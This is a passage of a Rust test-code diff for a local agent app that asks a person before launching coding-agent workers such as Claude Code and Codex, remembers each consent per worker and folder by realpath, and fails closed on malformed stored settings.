+        assert_eq!(files.registry_if_complete(), None, "nor an oversized one");
+        std::fs::write(&files.registry, REGISTRY).unwrap();
+        std::fs::remove_file(&files.adapter).unwrap();
+        assert_eq!(files.registry_if_complete(), None, "no adapter");
     }
 
     /// The view for `stored` and `found`, as the actor computes it.
-    fn view(choice: ModelChoice, found: Found, allowed: &[Worker]) -> L4View {
+    fn view(choice: ModelChoice, found: Found, allowed: &[&str]) -> L4View {
+        l4(choice, found, allowed).view
+    }
+
+    fn l4(choice: ModelChoice, found: Found, allowed: &[&str]) -> L4 {
         let mut l4 = L4 {
             stored: Stored {
                 model: choice.to_stored(),
-                allowed_workers: allowed.iter().map(|w| w.as_str().into()).collect(),
+                allowed_workers: allowed.iter().map(|w| w.to_string()).collect(),
+                worker_folders: Vec::new(),
             },
             found,
             looked: true,
             ..L4::default()
         };
         l4.refresh_view();
-        l4.view
+        l4
     }
 
     fn servers(list: Vec<Detected>) -> Found {
         Found {
             caps: BOTH,
             servers: Some(list),
+            registry: None,
             clis: Vec::new(),
         }
     }
@@ -2249,30 +3033,79 @@ mod tests {
 
     #[test]
     fn coding_agents_are_offered_only_when_installed_and_run_by_the_bundle() {
-        let clis = |caps: Caps, clis: Vec<Worker>| Found {
+        let clis = |caps: Caps, clis: &[&str]| Found {
             caps,
             servers: None,
-            clis,
+            registry: Some(registry()),
+            clis: clis.iter().map(|c| c.to_string()).collect(),
         };
-        assert!(!view(ModelChoice::Relay, clis(BOTH, vec![]), &[]).workers_shown(), "nothing installed");
+        assert!(!view(ModelChoice::Relay, clis(BOTH, &[]), &[]).workers_shown(), "nothing installed");
         assert!(
-            !view(ModelChoice::Relay, clis(Caps::default(), vec![Worker::ClaudeCode]), &[]).workers_shown(),
+            !view(ModelChoice::Relay, clis(Caps::default(), &["claude-code"]), &[]).workers_shown(),
             "a bundle without workers"
         );
-        let v = view(ModelChoice::Relay, clis(BOTH, vec![Worker::ClaudeCode]), &[]);
+        let no_registry = Found {
+            registry: None,
+            ..clis(BOTH, &["claude-code"])
+        };
+        assert!(!view(ModelChoice::Relay, no_registry, &[]).workers_shown(), "a bundle without a registry");
+        let v = view(ModelChoice::Relay, clis(BOTH, &["claude-code", "codex"]), &[]);
         assert_eq!(
             v.workers_menu(),
-            vec![choice(
-                "claude-code",
-                "Allow Claude Code (your own Claude account, with network access)",
-                false
-            )]
+            vec![
+                choice(
+                    "claude-code",
+                    "Allow Claude Code (your own Claude Code account, with network access)",
+                    false
+                ),
+                choice("codex", "Allow Codex (your own Codex account, with network access)", false),
+            ],
+            "each from the registry's label"
         );
         // Allowed and since uninstalled (or an older bundle): still there, to take back.
-        let kept = view(ModelChoice::Relay, clis(Caps::default(), vec![]), &[Worker::Codex]);
+        let kept = view(ModelChoice::Relay, clis(Caps::default(), &[]), &["codex"]);
         assert_eq!(
             kept.workers_menu(),
-            vec![choice("codex", "Allow Codex (your own OpenAI account, with network access)", true)]
+            vec![choice("codex", "Allow Codex (your own Codex account, with network access)", true)]
+        );
+        assert!(kept.worker_allowed("codex") && !kept.worker_allowed("claude-code"));
+        // One the registry no longer lists (or before Rust read it): named by
+        // its id; a stored id of another shape is left out.
+        let gone = view(ModelChoice::Relay, Found::default(), &["cursor", "Not An Id"]);
+        assert_eq!(gone.workers_menu(), vec![choice("cursor", "Allow cursor (not in this build)", true)]);
+    }
+
+    #[test]
+    fn the_status_offers_what_a_start_may_name_right_now() {
+        let found = |caps: Caps| Found {
+            caps,
+            servers: None,
+            registry: Some(registry()),
+            clis: vec!["claude-code".into(), "codex".into()],
+        };
+        let offer = |id: &str, label: &str| WorkerOffer {
+            id: id.into(),
+            label: label.into(),
+        };
+        assert_eq!(l4(ModelChoice::Relay, found(BOTH), &[]).offered(), Vec::<WorkerOffer>::new(), "nothing allowed");
+        assert_eq!(
+            l4(ModelChoice::Relay, found(BOTH), &["codex", "cursor"]).offered(),
+            vec![offer("codex", "Codex")],
+            "allowed, listed and installed"
+        );
+        let installed_one = Found {
+            clis: vec!["claude-code".into()],
+            ..found(BOTH)
+        };
+        assert_eq!(
+            l4(ModelChoice::Relay, installed_one, &["codex", "claude-code"]).offered(),
+            vec![offer("claude-code", "Claude Code")]
+        );
+        assert_eq!(l4(ModelChoice::Relay, found(Caps::default()), &["codex"]).offered(), Vec::<WorkerOffer>::new());
+        assert_eq!(
+            l4(local(LocalServer::Ollama, "m"), found(BOTH), &["codex"]).offered(),
+            Vec::<WorkerOffer>::new(),
+            "a local model refuses workers"
         );
     }
 
@@ -2353,11 +3186,13 @@ mod tests {
     /// eve's launcher, or a worker's adapter: says which script ran and what
     /// it was given, then waits for a message (never answering one) or a stop.
     const STAND_IN: &str = r#"
+# Our own agent's launcher names its eve server's port; a worker's adapter none.
+if [ -z "$LOCAL_AGENT_WORKER" ]; then printf '{"type":"ready","port":4123}\n'; else printf '{"type":"ready","port":0}\n'; fi
 while IFS= read -r line; do
   case "$line" in
     *'"type":"start"'*|*'"type":"resume"'*)
       printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
-      printf '{"type":"event","event":{"kind":"text","delta":"script=%s|worker=%s|bin=%s|local=%s|id=%s|relay=%s|token=%s|dev=%s|origin=%s"}}\n' "$(basename "$0")" "${LOCAL_AGENT_WORKER:-none}" "${LOCAL_AGENT_WORKER_BIN:-none}" "${LOCAL_AGENT_LOCAL_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_LOCAL_MODEL_ID:-none}" "${LOCAL_AGENT_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_MODEL_TOKEN:-none}" "${LOCAL_AGENT_DEV_ENV_FILE:-none}" "${LOCAL_AGENT_API_ORIGIN:-none}"
+      printf '{"type":"event","event":{"kind":"text","delta":"script=%s|worker=%s|bin=%s|acp=%s|fence=%s|markers=%s|closed=%s|cwd=%s|local=%s|id=%s|relay=%s|token=%s|dev=%s|origin=%s"}}\n' "$(basename "$0")" "${LOCAL_AGENT_WORKER:-none}" "${LOCAL_AGENT_WORKER_BIN:-none}" "${LOCAL_AGENT_ACP_DIR:-none}" "${LOCAL_AGENT_FENCE_DIR:-none}" "$( [ -f "${LOCAL_AGENT_FENCE_DIR:-/none}/$LOCAL_AGENT_JOB_ID" ] && [ -f "${LOCAL_AGENT_FENCE_DIR:-/none}/$LOCAL_AGENT_JOB_ID.open" ] && echo yes || echo no )" "${LOCAL_AGENT_CLOSED_PORTS-none}" "$(pwd -P)" "${LOCAL_AGENT_LOCAL_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_LOCAL_MODEL_ID:-none}" "${LOCAL_AGENT_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_MODEL_TOKEN:-none}" "${LOCAL_AGENT_DEV_ENV_FILE:-none}" "${LOCAL_AGENT_API_ORIGIN:-none}"
       printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
       ;;
     *'"type":"token"'*)
@@ -2387,6 +3222,10 @@ done
         /// What the stand-in for the port check finds.
         servers: Arc<Mutex<Vec<Detected>>>,
         looks: Arc<AtomicUsize>,
+        /// The fence's steps as the actor took them, in order (the real
+        /// sweep runs; the login return is only recorded).
+        fence_calls: Arc<Mutex<Vec<String>>>,
+        logins: Arc<Mutex<Vec<super::super::fence::LoginReturn>>>,
     }
 
     fn rig_with(model_json: Option<&str>) -> Rig {
@@ -2403,21 +3242,23 @@ done
         std::fs::create_dir_all(base.join("tmp")).unwrap();
         if let Some(json) = model_json {
             std::fs::create_dir_all(&root).unwrap();
-            std::fs::write(root.join(STORE_FILE), json).unwrap();
+            // `{base}`: the rig's own folder, for paths model.json names.
+            std::fs::write(root.join(STORE_FILE), json.replace("{base}", base.to_str().unwrap())).unwrap();
         }
         let launch = launch_config(&base);
         std::fs::write(&launch.launcher, STAND_IN).unwrap();
-        for w in Worker::ALL {
-            let p = base.join("agent/workers").join(format!("{}.sh", w.as_str()));
-            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
-            std::fs::write(p, STAND_IN).unwrap();
-        }
+        // The bundle's one adapter, its registry and the agents' adapters.
+        std::fs::create_dir_all(base.join("agent/workers")).unwrap();
+        std::fs::create_dir_all(base.join("agent/acp")).unwrap();
+        std::fs::write(base.join("agent/workers/acp.sh"), STAND_IN).unwrap();
+        std::fs::write(base.join("agent/workers/registry.json"), REGISTRY).unwrap();
         std::fs::write(
             base.join("agent/BUNDLE.json"),
             r#"{"capabilities":["local-model","workers"]}"#,
         )
         .unwrap();
         executable(&base.join("bin/claude"));
+        executable(&base.join("bin/codex"));
         let paths = Paths {
             root: root.clone(),
             tmp_root: base.join("tmp"),
@@ -2449,6 +3290,32 @@ done
             let found = s.lock().unwrap().clone();
             Box::pin(async move { found })
         });
+        use super::super::fence;
+        let fence_calls = Arc::new(Mutex::new(Vec::new()));
+        let logins = Arc::new(Mutex::new(Vec::new()));
+        let jobs = root.join("jobs");
+        let (calls, seen, jobs_at) = (fence_calls.clone(), rec.clone(), jobs.clone());
+        let (calls2, got, jobs_at2) = (fence_calls.clone(), logins.clone(), jobs);
+        actor.fence = fence::Ops {
+            sweep: Arc::new(move |dir: &Path, job: &str, scope: fence::Scope| {
+                let branches = seen
+                    .events
+                    .lock()
+                    .unwrap()
+                    .iter()
+                    .filter(|e| e.job_id == job && e.event["kind"] == "branch")
+                    .count();
+                calls.lock().unwrap().push(format!(
+                    "sweep {scope:?} branches={branches} folder={}",
+                    jobs_at.join(job).exists()
+                ));
+                fence::sweep(dir, job, scope)
+            }),
+            return_logins: Arc::new(move |job: &str, run: &fence::LoginReturn| {
+                calls2.lock().unwrap().push(format!("logins folder={}", jobs_at2.join(job).exists()));
+                got.lock().unwrap().push(run.clone());
+            }),
+        };
         tokio::spawn(actor.run());
         Rig {
             svc,
@@ -2459,6 +3326,8 @@ done
             grant: String::new(),
             servers,
             looks,
+            fence_calls,
+            logins,
         }
     }
 
@@ -2529,6 +3398,10 @@ done
                 .await
         }
 
+        fn fence_calls(&self) -> Vec<String> {
+            self.fence_calls.lock().unwrap().clone()
+        }
+
         fn on_disk(&self) -> Stored {
             Stored::load(&self.base.join("data/local-agent").join(STORE_FILE))
         }
@@ -2538,14 +3411,15 @@ done
         }
 
         /// The watcher's look, as if it had just run.
-        async fn found(&self, servers: Vec<Detected>, clis: Vec<Worker>) {
+        async fn found(&self, servers: Vec<Detected>, clis: &[&str]) {
             *self.servers.lock().unwrap() = servers.clone();
             self.svc
                 .cmds
                 .send(super::super::Cmd::Workers(Cmd::Found(Found {
                     caps: BOTH,
                     servers: Some(servers),
-                    clis,
+                    registry: Some(registry()),
+                    clis: clis.iter().map(|c| c.to_string()).collect(),
                 })))
                 .unwrap();
             // Ordered behind the message above.
@@ -2553,7 +3427,7 @@ done
         }
 
         async fn choose_local(&self, model: &str) {
-            self.found(vec![found(LocalServer::Ollama, true, &[model])], vec![]).await;
+            self.found(vec![found(LocalServer::Ollama, true, &[model])], &[]).await;
             self.svc.set_model(local(LocalServer::Ollama, model)).await.unwrap();
         }
     }
@@ -2568,31 +3442,53 @@ done
         );
         assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());
         // The yes needs a bundle that runs workers (Rust has looked).
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         assert_eq!(rig.on_disk().allowed_workers, vec!["claude-code".to_string()]);
         rig.svc.models().await.unwrap();
         assert_eq!(
             rig.rec.last_tray().unwrap().l4.workers,
-            vec![(Worker::ClaudeCode, true)],
+            vec![WorkerItem {
+                id: "claude-code".into(),
+                label: Some("Claude Code".into()),
+                allowed: true,
+            }],
             "the tray redraws with it"
+        );
+        assert_eq!(
+            rig.svc.status().await.unwrap().workers,
+            vec![WorkerOffer {
+                id: "claude-code".into(),
+                label: "Claude Code".into(),
+            }],
+            "and the page may now name it"
         );
 
         let id = rig.start(Some("claude-code")).await.unwrap();
         let got = rig.given(&id, 0).await;
-        assert_eq!(got["script"], "claude-code.sh");
+        assert_eq!(got["script"], "acp.sh", "the one adapter");
         assert_eq!(got["worker"], "claude-code");
         assert_eq!(got["bin"], rig.base.join("bin/claude").display().to_string());
+        assert_eq!(got["acp"], rig.base.join("agent/acp").display().to_string());
+        // Its fence markers, made before it was spawned, outside every job's folder.
+        assert_eq!(got["fence"], rig.base.join("data/local-agent/fence").display().to_string());
+        assert_eq!(got["markers"], "yes", "both markers existed when the adapter started");
+        assert_eq!(got["cwd"], rig.base.join("data/local-agent/jobs").join(&id).display().to_string());
         for k in ["relay", "token", "dev", "local", "origin"] {
             assert_eq!(got[k], "none", "{k}: a worker uses its vendor, not the relay or the session token");
         }
+        assert_eq!(got["closed"], "", "no listener of ours runs yet");
+        let eve = rig.start(None).await.unwrap();
+        let theirs = rig.given(&eve, 0).await;
+        assert_eq!((theirs["fence"].as_str(), theirs["markers"].as_str()), ("none", "no"), "eve's launcher has none");
+        assert_eq!(theirs["closed"], "none", "nor closed ports");
         assert_eq!(rig.jobs_on_disk().job(&id).unwrap().worker.as_deref(), Some("claude-code"));
         // Same stop handling as eve's launcher; a resume brings the same worker back.
         rig.waiting(&id).await;
         rig.svc.stop(id.clone()).await.unwrap();
         rig.exit_of(&id).await;
         rig.resume(&id).await.unwrap();
-        assert_eq!(rig.given(&id, 1).await["script"], "claude-code.sh");
+        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");
         let mut other = rig.args(Some("codex"));
         other.job_id = Some(id.clone());
         assert_eq!(
@@ -2612,8 +3508,8 @@ done
     #[tokio::test]
     async fn every_worker_launch_waits_for_a_yes_on_the_mac_and_a_no_runs_nothing() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let args = StartArgs {
             job_id: Some(uuid::Uuid::new_v4().to_string()),
             ..rig.args(Some("claude-code"))
@@ -2637,38 +3533,47 @@ done
         assert!(rig.jobs_on_disk().jobs.is_empty(), "nothing recorded");
         assert!(rig.rec.events.lock().unwrap().is_empty(), "nothing ran");
 
-        // A yes (once the no's hold-off is over): it runs, with no banner.
+        assert!(rig.on_disk().worker_folders.is_empty(), "a no is never remembered");
+
+        // A yes (once the no's hold-off is over): it runs, with no banner, and
+        // is remembered for Claude Code in this folder, by its realpath.
         past_the_backoff().await;
         let id = rig.svc.start_with(args, rig.launch.clone()).await.unwrap().job_id;
-        assert_eq!(rig.given(&id, 0).await["script"], "claude-code.sh");
+        assert_eq!(rig.given(&id, 0).await["script"], "acp.sh");
         assert!(rig.rec.notices.lock().unwrap().is_empty());
-        // A resume asks again.
+        assert_eq!(
+            rig.on_disk().worker_folders,
+            vec![serde_json::json!({ "worker": "claude-code", "folder": folder })]
+        );
+        // Its resume asks nothing, and tells nothing new (told within the day).
         rig.waiting(&id).await;
         rig.svc.stop(id.clone()).await.unwrap();
         rig.exit_of(&id).await;
-        rig.rec.answers.lock().unwrap().push_back(false);
-        assert_eq!(rig.resume(&id).await.unwrap_err(), SAID_NO);
-        assert_eq!(
-            rig.rec.asked.lock().unwrap().last().unwrap().title,
-            "Let Claude Code continue in project?"
-        );
-        assert_eq!(rig.jobs_on_disk().job(&id).unwrap().status, super::super::state::JobStatus::Cancelled);
-        past_the_backoff().await;
         rig.resume(&id).await.unwrap();
-        assert_eq!(rig.given(&id, 1).await["script"], "claude-code.sh");
-        assert_eq!(rig.rec.asked.lock().unwrap().len(), 4);
+        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
+        assert!(rig.rec.notices.lock().unwrap().is_empty());
+        // A new job there, read or edit alike, asks nothing: it is told, naming the agent.
+        let next = rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.given(&next, 0).await["worker"], "claude-code");
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2, "not asked again");
+        assert_eq!(
+            rig.rec.notices.lock().unwrap()[0].0,
+            "Claude Code started in project for Native Intelligence"
+        );
         // eve's jobs aren't asked; the person is told instead.
         let eve = rig.start(None).await.unwrap();
         rig.waiting(&eve).await;
-        assert_eq!(rig.rec.asked.lock().unwrap().len(), 4);
-        assert_eq!(rig.rec.notices.lock().unwrap().len(), 1);
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
+        assert_eq!(rig.rec.notices.lock().unwrap().len(), 2);
+        assert_eq!(rig.rec.notices.lock().unwrap()[1].0, "Agent started in project");
     }
 
     #[tokio::test]
     async fn a_worker_confirm_nobody_answers_is_a_no_and_one_is_up_at_a_time() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         rig.rec.hold.store(true, Ordering::SeqCst);
         let meanwhile = async {
             let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
@@ -2703,8 +3608,8 @@ done
     #[tokio::test]
     async fn a_stop_while_the_person_is_asked_wins_over_their_yes() {
         let rig = rig().await;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         rig.rec.hold.store(true, Ordering::SeqCst);
         let id = uuid::Uuid::new_v4().to_string();
         let args = StartArgs {
@@ -2724,6 +3629,64 @@ done
         let (started, ()) = tokio::join!(rig.svc.start_with(args, rig.launch.clone()), meanwhile);
         assert_eq!(started.unwrap_err(), "stopped before it started");
         assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());
+        // The person did say yes, and the agent is still on: remembered.
+        assert_eq!(rig.on_disk().worker_folders.len(), 1);
+    }
+
+    #[tokio::test]
+    async fn a_yes_after_the_agent_was_switched_off_is_not_remembered() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        rig.rec.hold.store(true, Ordering::SeqCst);
+        let meanwhile = async {
+            let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
+            while rig.rec.open.lock().unwrap().is_empty() {
+                assert!(tokio::time::Instant::now() < deadline, "never asked");
+                tokio::time::sleep(Duration::from_millis(10)).await;
+            }
+            // Switched off in the menu bar while the confirm is up, then "Run".
+            rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
+            let yes = rig.rec.open.lock().unwrap().pop().unwrap();
+            let _ = yes.send(true);
+        };
+        let (started, ()) = tokio::join!(rig.start(Some("claude-code")), meanwhile);
+        assert!(started.is_err(), "it doesn't run");
+        assert!(rig.on_disk().worker_folders.is_empty(), "and the folder isn't brought back");
+        rig.rec.hold.store(false, Ordering::SeqCst);
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2, "switched on again: asked afresh");
+    }
+
+    #[tokio::test]
+    async fn switching_off_holds_even_when_it_cant_be_saved() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        let id = rig.start(Some("claude-code")).await.unwrap();
+        rig.waiting(&id).await;
+        // The save's temp file can't be written: a folder is in its place.
+        std::fs::create_dir_all(rig.base.join("data/local-agent").join(format!("{STORE_FILE}.tmp"))).unwrap();
+        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
+        let view = rig.svc.models().await.unwrap();
+        assert!(!view.worker_allowed("claude-code"), "off, in memory");
+        assert_eq!(rig.on_disk().allowed_workers, ["claude-code"], "on disk as it was");
+        rig.exit_of(&id).await;
+        assert!(rig.start(Some("claude-code")).await.unwrap_err().contains("isn't allowed on this Mac"));
+        // Switching on fails closed.
+        assert!(rig.svc.allow_worker("claude-code".into(), true).await.is_err());
+        assert!(!rig.svc.models().await.unwrap().worker_allowed("claude-code"));
+    }
+
+    #[tokio::test]
+    async fn worker_folders_that_arent_a_list_fail_closed() {
+        let mut rig = rig_with(Some(r#"{"allowedWorkers":["claude-code"],"workerFolders":5}"#));
+        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
+        rig.found(vec![], &["claude-code"]).await;
+        assert!(rig.svc.status().await.unwrap().workers.is_empty(), "nothing allowed");
+        assert!(rig.start(Some("claude-code")).await.is_err());
+        assert!(rig.rec.asked.lock().unwrap().is_empty() && rig.rec.events.lock().unwrap().is_empty(), "nothing ran");
     }
 
     async fn snapshot_job(rig: &Rig, id: &str) -> Option<super::super::JobSummary> {
@@ -2732,34 +3695,21 @@ done
     }
 
     #[tokio::test]
-    async fn a_yes_runs_out_and_the_message_that_revives_it_is_shown_then_run() {
-        let mut rig = rig_tuned(None, |t| {
-            t.worker_yes_for = Duration::from_millis(400);
-            t.idle_check_every = Duration::from_secs(3600);
-        });
+    async fn a_worker_takes_follow_ups_for_as_long_as_it_lives_and_its_revival_isnt_asked() {
+        let mut rig = rig_tuned(None, |t| t.idle_check_every = Duration::from_secs(3600));
         rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
+        rig.found(vec![], &["claude-code"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
         let id = rig.start(Some("claude-code")).await.unwrap();
         rig.waiting(&id).await;
-        assert!(
-            rig.rec.asked.lock().unwrap()[0].body.contains("follow-up messages Native Intelligence sends it for the next 400 ms"),
-            "{}",
-            rig.rec.asked.lock().unwrap()[0].body
-        );
-        // Within the yes, a follow-up runs without asking.
+        tokio::time::sleep(Duration::from_millis(300)).await;
         rig.svc.send(id.clone(), "and the docs".into(), "queue".into()).await.unwrap();
         rig.rec
             .wait_for("the follow-up", |e| e.job_id == id && e.event["text"] == "ran and the docs")
             .await;
-        tokio::time::sleep(Duration::from_millis(500)).await;
-        // Past it: the next one parks it, and the relay's retry ("try again") resumes it.
-        assert_eq!(
-            rig.svc.send(id.clone(), "now the tests".into(), "queue".into()).await.unwrap_err(),
-            super::super::starts::YES_RAN_OUT
-        );
-        rig.rec.wait_for("parked", |e| e.job_id == id && e.event["reason"] == PARKED).await;
-        assert!(rig.svc.send(id.clone(), "now the tests".into(), "queue".into()).await.unwrap_err().contains("isn't running"));
+        // Parked (idle, or the app quit): the message that revives it runs, unasked.
+        rig.svc.stop(id.clone()).await.unwrap();
+        rig.exit_of(&id).await;
         let message = super::super::ResumeMessage {
             text: "now the tests".into(),
             policy: "queue".into(),
@@ -2768,34 +3718,135 @@ done
             .resume_as(id.clone(), Some(TOKEN.into()), None, Some(message), rig.launch.clone())
             .await
             .unwrap();
-        let asked = rig.rec.asked.lock().unwrap().clone();
-        assert_eq!(asked.len(), 2, "the revival asked again");
-        assert_eq!(asked[1].title, "Let Claude Code continue in project?");
-        assert!(
-            asked[1].body.contains("The message it runs now: \u{201C}now the tests\u{201D}"),
-            "{}",
-            asked[1].body
-        );
-        // What was shown is what runs: Rust sends it itself.
         rig.rec
             .wait_for("the revived message", |e| e.job_id == id && e.event["text"] == "ran now the tests")
             .await;
-        assert!(rig.rec.notices.lock().unwrap().is_empty(), "confirmed, never bannered");
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "asked once, at its first launch");
+        assert!(rig.rec.notices.lock().unwrap().is_empty(), "confirmed, then a revival: never bannered");
     }
 
     #[tokio::test]
-    async fn a_worker_past_its_yes_is_parked_without_a_message() {
-        let mut rig = rig_tuned(None, |t| {
-            t.worker_yes_for = Duration::from_millis(300);
-            t.idle_check_every = Duration::from_millis(50);
-        });
+    async fn a_yes_is_for_that_agent_in_that_folder_only() {
+        let rig = rig().await;
+        let sub = rig.base.join("home/project/sub");
+        let sibling = rig.base.join("home/other");
+        std::fs::create_dir_all(&sub).unwrap();
+        std::fs::create_dir_all(&sibling).unwrap();
+        let sub = rig.svc.add_grant(sub, GrantMode::Read).await.unwrap().id;
+        let sibling = rig.svc.add_grant(sibling, GrantMode::Read).await.unwrap().id;
+        rig.found(vec![], &["claude-code", "codex"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        rig.svc.allow_worker("codex".into(), true).await.unwrap();
+        rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1);
+        rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "same agent, same folder: not asked");
+        // Another agent in the same folder is asked.
+        rig.start(Some("codex")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
+        assert_eq!(rig.rec.asked.lock().unwrap()[1].title, "Let Codex work in project?");
+        // A sub-folder, and another folder, are asked.
+        for grant in [sub, sibling] {
+            let args = StartArgs {
+                grant_id: grant,
+                ..rig.args(Some("claude-code"))
+            };
+            rig.svc.start_with(args, rig.launch.clone()).await.unwrap();
+        }
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 4);
+    }
+
+    #[tokio::test]
+    async fn switching_a_worker_off_forgets_its_folders() {
+        let rig = rig().await;
+        rig.found(vec![], &["claude-code", "codex"]).await;
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        rig.svc.allow_worker("codex".into(), true).await.unwrap();
+        let first = rig.start(Some("claude-code")).await.unwrap();
+        rig.start(Some("codex")).await.unwrap();
+        assert_eq!(rig.on_disk().worker_folders.len(), 2);
+        rig.waiting(&first).await;
+        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
+        let folders = rig.on_disk().worker_folders;
+        assert_eq!(folders.len(), 1, "Codex's yes stays: {folders:?}");
+        assert_eq!(folders[0]["worker"], "codex");
+        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
+        rig.start(Some("claude-code")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 3, "switched on again: asked afresh");
+    }
+
+    #[tokio::test]
+    async fn a_remembered_yes_survives_a_relaunch_and_odd_entries_grant_nothing() {
+        let mut rig = rig_with(Some(
+            r#"{"allowedWorkers":["claude-code","codex"],"workerFolders":[
+                {"worker":"claude-code","folder":"{base}/home/project"},
+                {"worker":"Codex","folder":"{base}/home/project"},
+                {"worker":"codex","folder":"home/project"},
+                {"worker":"codex","folder":"{base}/home/x/../project"},
+                {"worker":"codex"},
+                "junk",
+                7
+            ]}"#,
+        ));
         rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
-        rig.found(vec![], vec![Worker::ClaudeCode]).await;
-        rig.svc.allow_worker(Worker::ClaudeCode, true).await.unwrap();
-        let worker = rig.start(Some("claude-code")).await.unwrap();
-        let eve = rig.start(None).await.unwrap();
-        rig.rec.wait_for("parked", |e| e.job_id == worker && e.event["reason"] == PARKED).await;
-        assert!(snapshot_job(&rig, &eve).await.unwrap().live, "eve's job has no yes to run out");
+        rig.found(vec![], &["claude-code", "codex"]).await;
+        rig.start(Some("claude-code")).await.unwrap();
+        assert!(rig.rec.asked.lock().unwrap().is_empty(), "the yes from before the relaunch counts");
+        assert_eq!(rig.rec.notices.lock().unwrap()[0].0, "Claude Code started in project for Native Intelligence");
+        rig.start(Some("codex")).await.unwrap();
+        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "no odd entry is a yes for Codex");
+        assert_eq!(rig.on_disk().worker_folders.len(), 8, "odd entries are kept as they are, never dropped or used");
+    }
+
+    #[test]
+    fn a_remembered_folder_is_a_realpath_and_a_link_put_in_its_place_isnt_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let base = std::fs::canonicalize(dir.path()).unwrap();
+        let site = base.join("site");
+        std::fs::create_dir_all(&site).unwrap();
+        let site_s = site.to_str().unwrap();
+        assert_eq!(yes_folder(site_s).as_deref(), Some(site_s));
+        // A link to it is not the folder a grant names (grants are realpaths).
+        let link = base.join("link");
+        std::os::unix::fs::symlink(&site, &link).unwrap();
+        assert_eq!(yes_folder(link.to_str().unwrap()), None);
+        // Deleted and made again at the same path: the yes is for the path,
+        // so it still holds (by design).
+        let kept = Stored {
+            allowed_workers: vec!["claude-code".into()],
+            worker_folders: vec![serde_json::json!({ "worker": "claude-code", "folder": site_s })],
+            ..Stored::default()
+        };
+        std::fs::remove_dir_all(&site).unwrap();
+        std::fs::create_dir_all(&site).unwrap();
+        assert!(yes_folder(site_s).is_some_and(|f| kept.remembers("claude-code", &f)));
+        // The folder replaced by a link to somewhere else after the yes.
+        let elsewhere = base.join("elsewhere");
+        std::fs::create_dir_all(&elsewhere).unwrap();
+        std::fs::rename(&site, base.join("site-old")).unwrap();
+        std::os::unix::fs::symlink(&elsewhere, &site).unwrap();
+        assert_eq!(yes_folder(site_s), None, "now resolves elsewhere: no yes");
+        let stored = Stored {
+            allowed_workers: vec!["claude-code".into()],
+            worker_folders: vec![serde_json::json!({ "worker": "claude-code", "folder": site_s })],
+            ..Stored::default()
+        };
+        assert!(stored.remembers("claude-code", site_s));
+        assert!(!stored.remembers("codex", site_s), "bound to the worker id");
+        assert!(!stored.remembers("claude-code", &format!("{site_s}/sub")), "not a sub-folder");
+        assert!(!stored.remembers("claude-code", base.to_str().unwrap()), "not a parent");
+        for odd in [
